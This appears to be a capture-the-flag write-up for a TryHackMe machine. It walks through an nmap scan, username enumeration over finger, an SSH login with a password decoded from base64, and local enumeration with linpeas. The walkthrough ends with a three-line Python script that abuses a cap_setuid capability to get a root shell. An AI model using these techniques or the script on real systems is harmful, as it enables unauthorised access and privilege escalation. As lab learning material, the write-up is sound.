## NMAP
```bash
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-27 18:43 -0500  
Nmap scan report for 10.10.125.213  
Host is up (0.18s latency).  
Not shown: 997 closed tcp ports (conn-refused)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 9b:d4:52:7d:75:fa:7e:bd:9f:ce:0d:ca:9b:4d:01:61 (ECDSA)  
|_  256 04:6e:71:c4:71:46:5e:cb:0e:3b:3d:4c:c9:66:0b:87 (ED25519)  
79/tcp open  finger  Linux fingerd  
|_finger: No one logged on.\x0D  
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))  
|_http-server-header: Apache/2.4.52 (Ubuntu)  
|_http-title: PrecisionChess IoT - Smart Chessboard Control  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## SSH
SSH has password based authentication, potential vector.

## Finger 
- **Very old protocol**, often used to get usernames and info on logged-in users.
    
- If misconfigured, it can leak valid usernames.
    

![Pasted image 20250627185352.png](Images/Pasted%20image%2020250627185352.png)

I tested:

```
finger username@IP
```

root
magnus
Magnus
fabiano

![Pasted image 20250627185704.png](Images/Pasted%20image%2020250627185704.png)
Got a hit with fabio, decoded the base64 and got a password for SSH. Knew password based SSH would be notable.

Logged in to SSH and retrieved `user.txt` flag.

## Privilege Escalation

No `sudo -l` permissions 

`cat /etc/passwd`

```bash
fabiano@tryhackme-2204:~$ cat /etc/passwd  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin  
syslog:x:104:110::/home/syslog:/usr/sbin/nologin  
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin  
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false  
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin  
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin  
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin  
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin  
pollinate:x:111:1::/var/cache/pollinate:/bin/false  
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin  
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash  
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false  
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin  
hikaru:x:1001:1001:,,,:/home/hikaru:/bin/bash  
magnus:x:1002:1002:,,,:/home/magnus:/bin/bash  
fabiano:x:1003:1003:,,,:/home/fabiano:/bin/bash
```

`uname -a`

```bash
fabiano@tryhackme-2204:~$ uname -a  
Linux tryhackme-2204 6.8.0-1030-aws #32~22.04.1-Ubuntu SMP Thu Jun  5 08:38:24 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

`cat /proc/version`

```bash
fabiano@tryhackme-2204:~$ cat /proc/version  
Linux version 6.8.0-1030-aws (buildd@lcy02-amd64-048) (x86_64-linux-gnu-gcc-12 (Ubuntu 12.3.0-1ubuntu1~22.04) 12.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #32~22.04.1-Ubuntu SMP T  
hu Jun  5 08:38:24 UTC 2025  
fabiano@tryhackme-2204:~$
```

`find / -perm -u=s -type f 2>/dev/null`

```bash
fabiano@tryhackme-2204:~$ find / -perm -u=s -type f 2>/dev/null  
/snap/core20/2434/usr/bin/chfn  
/snap/core20/2434/usr/bin/chsh  
/snap/core20/2434/usr/bin/gpasswd  
/snap/core20/2434/usr/bin/mount  
/snap/core20/2434/usr/bin/newgrp  
/snap/core20/2434/usr/bin/passwd  
/snap/core20/2434/usr/bin/su  
/snap/core20/2434/usr/bin/sudo  
/snap/core20/2434/usr/bin/umount  
/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/snap/core20/2434/usr/lib/openssh/ssh-keysign  
/snap/core/17212/bin/mount  
/snap/core/17212/bin/ping  
/snap/core/17212/bin/ping6  
/snap/core/17212/bin/su  
/snap/core/17212/bin/umount  
/snap/core/17212/usr/bin/chfn  
/snap/core/17212/usr/bin/chsh  
/snap/core/17212/usr/bin/gpasswd  
/snap/core/17212/usr/bin/newgrp  
/snap/core/17212/usr/bin/passwd  
/snap/core/17212/usr/bin/sudo  
/snap/core/17212/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/snap/core/17212/usr/lib/openssh/ssh-keysign  
/snap/core/17212/usr/lib/snapd/snap-confine  
/snap/core/17212/usr/sbin/pppd  
/snap/core18/2887/bin/mount  
/snap/core18/2887/bin/ping  
/snap/core18/2887/bin/su  
/snap/core18/2887/bin/umount  
/snap/core18/2887/usr/bin/chfn  
/snap/core18/2887/usr/bin/chsh  
/snap/core18/2887/usr/bin/gpasswd  
/snap/core18/2887/usr/bin/newgrp  
/snap/core18/2887/usr/bin/passwd  
/snap/core18/2887/usr/bin/sudo  
/snap/core18/2887/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/snap/core18/2887/usr/lib/openssh/ssh-keysign  
/snap/core18/1885/bin/mount  
/snap/core18/1885/bin/ping  
/snap/core18/1885/bin/su  
/snap/core18/1885/bin/umount  
/snap/core18/1885/usr/bin/chfn  
/snap/core18/1885/usr/bin/chsh  
/snap/core18/1885/usr/bin/gpasswd  
/snap/core18/1885/usr/bin/newgrp  
/snap/core18/1885/usr/bin/passwd  
/snap/core18/1885/usr/bin/sudo  
/snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/snap/core18/1885/usr/lib/openssh/ssh-keysign  
/snap/core22/1621/usr/bin/chfn  
/snap/core22/1621/usr/bin/chsh  
/snap/core22/1621/usr/bin/gpasswd  
/snap/core22/1621/usr/bin/mount  
/snap/core22/1621/usr/bin/newgrp  
/snap/core22/1621/usr/bin/passwd  
/snap/core22/1621/usr/bin/su  
/snap/core22/1621/usr/bin/sudo  
/snap/core22/1621/usr/bin/umount  
/snap/core22/1621/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/snap/core22/1621/usr/lib/openssh/ssh-keysign  
/snap/core22/1621/usr/libexec/polkit-agent-helper-1  
/snap/core22/2010/usr/bin/chfn  
/snap/core22/2010/usr/bin/chsh  
/snap/core22/2010/usr/bin/gpasswd  
/snap/core22/2010/usr/bin/mount  
/snap/core22/2010/usr/bin/newgrp  
/snap/core22/2010/usr/bin/passwd  
/snap/core22/2010/usr/bin/su  
/snap/core22/2010/usr/bin/sudo  
/snap/core22/2010/usr/bin/umount  
/snap/core22/2010/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/snap/core22/2010/usr/lib/openssh/ssh-keysign  
/snap/core22/2010/usr/libexec/polkit-agent-helper-1  
/usr/libexec/polkit-agent-helper-1  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/lib/openssh/ssh-keysign  
/usr/lib/snapd/snap-confine  
/usr/bin/chfn  
/usr/bin/pkexec  
/usr/bin/sudo  
/usr/bin/umount  
/usr/bin/passwd  
/usr/bin/gpasswd  
/usr/bin/newgrp  
/usr/bin/chsh  
/usr/bin/fusermount3  
/usr/bin/su  
/usr/bin/mount
```

`/snap/core18/1885/usr/lib/openssh/ssh-keysign` could be of interest.

Checked out `/home/magnus` and `/home/hikaru` using `ls -la`

Some interesting files like `.bash_history`, not accessible though.

Decided to make life easier and use [linpeas](https://github.com/peass-ng/PEASS-ng). 

Vector found by linpeas.sh:

`/usr/bin/python3.10 cap_setuid=ep`

Used chatGPT to create an exploit script:

```bash
import os
os.setuid(0)
os.system("/bin/sh")
```

```bash
python3.10 exploit.py
```

Gained root shell, found `root.txt` in `/root`



